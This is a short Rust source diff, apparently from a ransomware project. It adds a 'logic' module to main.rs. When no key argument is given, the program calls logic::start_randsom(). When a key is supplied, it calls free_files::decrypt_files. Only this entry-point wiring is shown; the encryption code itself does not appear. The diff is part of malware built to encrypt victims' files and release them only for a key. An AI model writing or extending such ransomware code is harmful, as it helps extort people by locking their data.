@@ -1,4 +1,5 @@
 mod free_files;
+mod logic;
 use clap::Parser;
 
 #[derive(Parser, Debug)]
@@ -16,6 +17,8 @@ fn main() {
     if let Some(key) = args.key {
         free_files::decrypt_files(&key);
     } else {
-        
+        if let Err(e) = logic::start_randsom() {
+            println!("{e}");
+        }
     }
 }
